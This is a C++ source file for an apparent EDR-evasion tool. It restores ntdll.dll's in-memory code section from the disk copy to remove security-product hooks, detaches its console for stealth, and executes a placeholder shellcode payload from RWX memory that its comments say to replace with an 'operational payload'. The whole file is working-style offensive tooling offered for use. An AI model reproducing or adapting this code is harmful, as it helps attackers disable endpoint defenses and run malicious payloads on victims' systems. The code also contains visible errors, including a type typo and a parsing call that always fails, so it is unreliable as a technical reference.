#include <windows.h>
#include <cstring>
#include <cstdint>
#include <cstddef>

#ifdef _MSC_VER
#pragma comment(lib, "kernel32.lib")
#endif

// ============================================================================
// NTDLL Unhook — Merged Optimal Implementation
//
// Combines:
//   - Script 1: robust PE parsing, bounds-checked copy, FlushInstructionCache,
//               direct-call payload execution, clean resource management
//   - Script 2: memory-mapped file I/O (more efficient), FreeConsole stealth
//
// Additional improvements:
//   - Meaningful post-overwrite verification (byte comparison)
//   - Anti-tamper: validates on-disk PE integrity before use
//   - Section layout validation (loaded vs. disk must match)
//   - No CreateThread (avoids a heavily-monitored EDR trigger)
//
// Limitations (applies to any user-mode .text restore):
//   - Does NOT fix IAT/EAT hooks
//   - Does NOT fix kernel-mode hooks (SSDT, callbacks, minifilters)
//   - Does NOT survive if the on-disk ntdll has been tampered with
//     (mitigated here by PE integrity check, but not a full hash comparison)
// ============================================================================

// ---------------------------------------------------------------------------
// Constants
// ---------------------------------------------------------------------------
static constexpr const wchar_t* kNtdllPath     = L"C:\\Windows\\System32\\ntdll.dll";
static constexpr const wchar_t* kNtdllName     = L"ntdll.dll";
static constexpr SIZE_T         kVerifyChunk   = 4096;  // bytes to compare for verification
static constexpr const char*    kTextSection   = ".text";

// ---------------------------------------------------------------------------
// PE Section Descriptor
// ---------------------------------------------------------------------------
struct SectionInfo {
    DWORD  rva;
    DWORD  virtualSize;
    DWORD  rawOffset;
    DWORD  rawSize;
    DWORD  characteristics;
};

// ---------------------------------------------------------------------------
// Robust PE Parsing
// ---------------------------------------------------------------------------
struct PeContext {
    const BYTE* base;
    SIZE_T      imageSize;          // total mapped/loaded size
    WORD        machine;
    WORD        numberOfSections;
    const IMAGE_SECTION_HEADER* sections;
    // Validated offsets
    SIZE_T      ntOffset;
    SIZE_T      optionalHeaderOffset;
    DWORD       sizeOfImage;
    DWORD       sizeOfHeaders;
};

static bool ParsePe(const BYTE* base, SIZE_t totalSize, PeContext& ctx)
{
    // --- DOS Header ---
    if (totalSize < sizeof(IMAGE_DOS_HEADER)) return false;
    const auto* dos = reinterpret_cast<const IMAGE_DOS_HEADER*>(base);
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return false;

    // --- e_lfanew bounds ---
    LONG eLfanew = dos->e_lfanew;
    if (eLfanew <= 0 || static_cast<SIZE_T>(eLfanew) >= totalSize) return false;
    ctx.ntOffset = static_cast<SIZE_T>(eLfanew);

    // --- NT Signature ---
    if (ctx.ntOffset + sizeof(IMAGE_NT_SIGNATURE) > totalSize) return false;
    DWORD sig = *reinterpret_cast<const DWORD*>(base + ctx.ntOffset);
    if (sig != IMAGE_NT_SIGNATURE) return false;

    // --- File Header ---
    SIZE_T fileHdrOff = ctx.ntOffset + sizeof(DWORD);
    if (fileHdrOff + sizeof(IMAGE_FILE_HEADER) > totalSize) return false;
    const auto* fileHdr = reinterpret_cast<const IMAGE_FILE_HEADER*>(base + fileHdrOff);
    ctx.machine            = fileHdr->Machine;
    ctx.numberOfSections   = fileHdr->NumberOfSections;
    if (ctx.numberOfSections == 0 || ctx.numberOfSections > 96) return false;

    // --- Optional Header ---
    ctx.optionalHeaderOffset = fileHdrOff + sizeof(IMAGE_FILE_HEADER);
    if (ctx.optionalHeaderOffset + 2 > totalSize) return false;
    WORD optMagic = *reinterpret_cast<const WORD*>(base + ctx.optionalHeaderOffset);
    if (optMagic != IMAGE_NT_OPTIONAL_HDR32_MAGIC &&
        optMagic != IMAGE_NT_OPTIONAL_HDR64_MAGIC)
        return false;

    SIZE_T optHdrSize = fileHdr->SizeOfOptionalHeader;
    if (optHdrSize == 0 ||
        ctx.optionalHeaderOffset + optHdrSize > totalSize)
        return false;

    // Extract SizeOfImage from the correct variant
    if (optMagic == IMAGE_NT_OPTIONAL_HDR64_MAGIC) {
        const auto* opt64 = reinterpret_cast<const IMAGE_OPTIONAL_HEADER64*>(
            base + ctx.optionalHeaderOffset);
        ctx.sizeOfImage   = opt64->SizeOfImage;
        ctx.sizeOfHeaders = opt64->SizeOfHeaders;
    } else {
        const auto* opt32 = reinterpret_cast<const IMAGE_OPTIONAL_HEADER32*>(
            base + ctx.optionalHeaderOffset);
        ctx.sizeOfImage   = opt32->SizeOfImage;
        ctx.sizeOfHeaders = opt32->SizeOfHeaders;
    }

    if (ctx.sizeOfImage == 0) return false;

    // --- Section Table ---
    SIZE_T secTableOff = ctx.optionalHeaderOffset + optHdrSize;
    SIZE_T secTableSize = static_cast<SIZE_T>(ctx.numberOfSections)
                        * sizeof(IMAGE_SECTION_HEADER);
    if (secTableOff + secTableSize > totalSize) return false;
    ctx.sections = reinterpret_cast<const IMAGE_SECTION_HEADER*>(base + secTableOff);

    return true;
}

// ---------------------------------------------------------------------------
// Section Lookup
// ---------------------------------------------------------------------------
static bool FindSection(const PeContext& pe, const char* name, SectionInfo& out)
{
    size_t nameLen = std::strlen(name);
    for (WORD i = 0; i < pe.numberOfSections; ++i) {
        const auto& s = pe.sections[i];
        // Section names are 8 bytes, null-terminated or not
        if (std::memcmp(s.Name, name, nameLen) == 0) {
            out.rva             = s.VirtualAddress;
            out.virtualSize     = s.Misc.VirtualSize ? s.Misc.VirtualSize : s.SizeOfRawData;
            out.rawOffset       = s.PointerToRawData;
            out.rawSize         = s.SizeOfRawData;
            out.characteristics = s.Characteristics;
            return true;
        }
    }
    return false;
}

// Fallback: find the first executable section
static bool FindCodeSection(const PeContext& pe, SectionInfo& out)
{
    for (WORD i = 0; i < pe.numberOfSections; ++i) {
        const auto& s = pe.sections[i];
        if ((s.Characteristics & IMAGE_SCN_CNT_CODE) ||
            (s.Characteristics & IMAGE_SCN_MEM_EXECUTE)) {
            out.rva             = s.VirtualAddress;
            out.virtualSize     = s.Misc.VirtualSize ? s.Misc.VirtualSize : s.SizeOfRawData;
            out.rawOffset       = s.PointerToRawData;
            out.rawSize         = s.SizeOfRawData;
            out.characteristics = s.Characteristics;
            return true;
        }
    }
    return false;
}

// ---------------------------------------------------------------------------
// Memory-Mapped File I/O (from Script 2, with proper error handling)
// ---------------------------------------------------------------------------
struct MappedFile {
    HANDLE    hFile    = INVALID_HANDLE_VALUE;
    HANDLE    hMapping = INVALID_HANDLE_VALUE;
    BYTE*     data     = nullptr;
    SIZE_T    size     = 0;
};

static bool MapFile(const wchar_t* path, MappedFile& mf)
{
    mf.hFile = CreateFileW(
        path,
        GENERIC_READ,
        FILE_SHARE_READ | FILE_SHARE_DELETE,
        nullptr,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        nullptr);
    if (mf.hFile == INVALID_HANDLE_VALUE) return false;

    LARGE_INTEGER sz;
    if (!GetFileSizeEx(mf.hFile, &sz) || sz.QuadPart <= 0) {
        CloseHandle(mf.hFile);
        mf.hFile = INVALID_HANDLE_VALUE;
        return false;
    }
    mf.size = static_cast<SIZE_T>(sz.QuadPart);

    mf.hMapping = CreateFileMappingW(
        mf.hFile,
        nullptr,
        PAGE_READONLY,
        0, 0,
        nullptr);
    if (!mf.hMapping) {
        CloseHandle(mf.hFile);
        mf.hFile = INVALID_HANDLE_VALUE;
        return false;
    }

    mf.data = static_cast<BYTE*>(
        MapViewOfFile(mf.hMapping, FILE_MAP_READ, 0, 0, 0));
    if (!mf.data) {
        CloseHandle(mf.hMapping);
        CloseHandle(mf.hFile);
        mf.hMapping = INVALID_HANDLE_VALUE;
        mf.hFile    = INVALID_HANDLE_VALUE;
        return false;
    }

    return true;
}

static void UnmapFile(MappedFile& mf)
{
    if (mf.data)     { UnmapViewOfFile(mf.data);     mf.data     = nullptr; }
    if (mf.hMapping) { CloseHandle(mf.hMapping);      mf.hMapping = nullptr; }
    if (mf.hFile != INVALID_HANDLE_VALUE) { CloseHandle(mf.hFile); mf.hFile = INVALID_HANDLE_VALUE; }
}

// ---------------------------------------------------------------------------
// PE Integrity Check (lightweight anti-tamper)
//
// Verifies that the on-disk PE is structurally sound and that its
// section table is internally consistent. A full hash comparison would
// require a trusted reference, which we don't have at runtime.
// ---------------------------------------------------------------------------
static bool ValidatePeIntegrity(const PeContext& pe, SIZE_T totalFileSize)
{
    // SizeOfImage should be page-aligned
    if ((pe.sizeOfImage & 0xFFF) != 0) return false;

    // Every section's raw data must fit within the file
    for (WORD i = 0; i < pe.numberOfSections; ++i) {
        const auto& s = pe.sections[i];
        if (s.SizeOfRawData == 0) continue;
        if (static_cast<SIZE_T>(s.PointerToRawData) + s.SizeOfRawData > totalFileSize)
            return false;
        // VirtualAddress should be within SizeOfImage
        if (s.VirtualAddress >= pe.sizeOfImage) return false;
    }

    return true;
}

// ---------------------------------------------------------------------------
// Core Unhook
// ---------------------------------------------------------------------------
struct UnhookResult {
    bool    success       = false;
    bool    verified      = false;
    DWORD   bytesCopied   = 0;
    DWORD   sectionRva    = 0;
    DWORD   sectionSize   = 0;
    const char* sectionName = nullptr;
};

static bool UnhookNtdll(UnhookResult& result)
{
    // --- Resolve loaded module ---
    HMODULE hLoaded = GetModuleHandleW(kNtdllName);
    if (!hLoaded) return false;

    BYTE* loadedBase = reinterpret_cast<BYTE*>(hLoaded);

    // --- Map clean copy from disk ---
    MappedFile clean;
    if (!MapFile(kNtdllPath, clean)) return false;

    // --- Parse both PEs ---
    PeContext peLoaded, peClean;
    SIZE_T loadedSize = 0;

    // For the loaded image, use SizeOfImage from its own headers
    if (!ParsePe(loadedBase, 0, peLoaded)) { UnmapFile(clean); return false; }
    loadedSize = peLoaded.sizeOfImage;

    if (!ParsePe(clean.data, clean.size, peClean)) { UnmapFile(clean); return false; }

    // --- Sanity: both must be same architecture ---
    if (peLoaded.machine != peClean.machine) { UnmapFile(clean); return false; }

    // --- Validate disk copy integrity ---
    if (!ValidatePeIntegrity(peClean, clean.size)) { UnmapFile(clean); return false; }

    // --- Locate target section in both images ---
    SectionInfo secLoaded, secClean;
    const char* secName = nullptr;

    if (FindSection(peLoaded, kTextSection, secLoaded) &&
        FindSection(peClean,  kTextSection, secClean)) {
        secName = kTextSection;
    } else if (FindCodeSection(peLoaded, secLoaded) &&
               FindCodeSection(peClean,  secClean)) {
        secName = "(first executable)";
    } else {
        UnmapFile(clean);
        return false;
    }

    // --- Validate section layout compatibility ---
    // The RVAs must match; if they don't, the images are different versions
    // and a blind overwrite is unsafe.
    if (secLoaded.rva != secClean.rva) {
        // Mismatch: the loaded ntdll and disk ntdll are different builds.
        // Abort rather than risk corrupting the process.
        UnmapFile(clean);
        return false;
    }

    // --- Compute safe copy size ---
    // Destination: loaded .text virtual size (what the loader allocated)
    // Source:       clean .text raw size (what's actually in the file)
    DWORD destSize = secLoaded.virtualSize;
    DWORD srcSize  = secClean.rawSize;

    if (destSize == 0 || srcSize == 0) { UnmapFile(clean); return false; }

    // Clamp: never write more than the destination can hold
    DWORD copySize = (destSize < srcSize) ? destSize : srcSize;

    // Clamp: never read past the end of the mapped file
    SIZE_T srcOffset = secClean.rawOffset;
    if (srcOffset + copySize > clean.size) {
        copySize = static_cast<DWORD>(clean.size - srcOffset);
    }

    if (copySize == 0) { UnmapFile(clean); return false; }

    // --- Perform the overwrite ---
    BYTE* dst = loadedBase + secLoaded.rva;
    const BYTE* src = clean.data + srcOffset;

    DWORD oldProtect = 0;
    if (!VirtualProtect(dst, destSize, PAGE_EXECUTE_READWRITE, &oldProtect)) {
        UnmapFile(clean);
        return false;
    }

    // Write the clean bytes
    std::memcpy(dst, src, copySize);

    // Zero the gap between raw and virtual size (replicates loader behavior)
    if (destSize > copySize) {
        std::memset(dst + copySize, 0, destSize - copySize);
    }

    // Restore original protection
    DWORD dummy = 0;
    VirtualProtect(dst, destSize, oldProtect, &dummy);

    // Invalidate instruction cache (critical on x86/x64)
    FlushInstructionCache(GetCurrentProcess(), dst, destSize);

    // --- Verify: compare first chunk of .text in memory vs. disk ---
    SIZE_T verifyLen = (kVerifyChunk < static_cast<SIZE_T>(copySize))
                       ? kVerifyChunk : static_cast<SIZE_T>(copySize);
    result.verified = (std::memcmp(dst, src, verifyLen) == 0);

    // --- Fill result ---
    result.success     = true;
    result.bytesCopied = copySize;
    result.sectionRva  = secLoaded.rva;
    result.sectionSize = destSize;
    result.sectionName = secName;

    UnmapFile(clean);
    return true;
}

// ---------------------------------------------------------------------------
// Optional: Execute a post-unhook payload via direct call (not CreateThread)
//
// This demonstrates that the process can still execute new code after the
// overwrite. In an operational context, you'd call the now-unhooked ntdll
// function directly here.
// ---------------------------------------------------------------------------
static bool ExecutePostUnhookPayload()
{
    // Minimal x64/x86 shellcode: xor eax, eax; ret
    // In practice, replace with your operational payload.
#if defined(_M_X64) || defined(__x86_64__)
    BYTE payload[] = { 0x31, 0xC0, 0xC3 };  // xor eax,eax; ret
#elif defined(_M_IX86) || defined(__i386__)
    BYTE payload[] = { 0x31, 0xC0, 0xC3 };  // xor eax,eax; ret
#else
    return false;
#endif

    SIZE_T sz = sizeof(payload);
    LPVOID mem = VirtualAlloc(nullptr, sz, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!mem) return false;

    std::memcpy(mem, payload, sz);
    FlushInstructionCache(GetCurrentProcess(), mem, sz);

    // Direct call — avoids CreateThread (which EDRs heavily monitor)
    typedef DWORD (*Fn)();
    Fn fn = reinterpret_cast<Fn>(mem);
    fn();

    VirtualFree(mem, 0, MEM_RELEASE);
    return true;
}

// ---------------------------------------------------------------------------
// Entry Point
// ---------------------------------------------------------------------------
int main()
{
    // Basic stealth: detach console (trivially detectable, but low cost)
    FreeConsole();

    UnhookResult result;

    if (!UnhookNtdll(result)) {
        // Failure: could be permission issue, file locked, version mismatch, etc.
        return 1;
    }

    if (!result.verified) {
        // Overwrite happened but verification failed — something is wrong
        return 2;
    }

    // Unhook succeeded and is verified. Execute post-unhook payload.
    ExecutePostUnhookPayload();

    return 0;
}
